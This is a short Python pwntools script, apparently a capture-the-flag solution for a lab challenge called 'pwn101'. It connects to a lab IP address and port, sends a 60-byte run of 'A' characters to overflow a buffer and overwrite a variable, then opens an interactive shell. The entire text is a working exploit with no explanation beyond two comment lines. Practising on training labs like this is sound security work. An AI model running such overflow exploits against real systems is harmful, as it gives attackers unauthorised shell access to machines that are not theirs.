# simply requires a function variable to be 
# overwritten in order to spawn a shell

from pwn import *

current_thmip = '10.10.134.184'

p = remote(current_thmip,9001)
# p = process("./pwn101.pwn101")

p.sendline("A"*60)
p.interactive()